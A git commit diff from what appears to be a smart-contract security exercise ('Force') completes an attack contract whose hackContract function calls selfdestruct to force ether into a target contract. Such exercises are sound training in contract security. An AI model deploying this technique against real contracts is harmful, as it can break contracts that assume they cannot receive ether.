44ade115ca017bc47ab509cefef18d4360c98e44
TonyG <tonyzgao@gmail.com>
2022-07-09 19:14:59 +0200

    complete force

--- contracts/3. Force/AttackingForce.sol
+++ contracts/3. Force/AttackingForce.sol
@@ -10,6 +10,7 @@ contract AttackingForce {
     }
 
     function hackContract() external {
-        // Code me!
+        address payable addr = payable(address(contractAddress));
+        selfdestruct(addr);
     }
 }
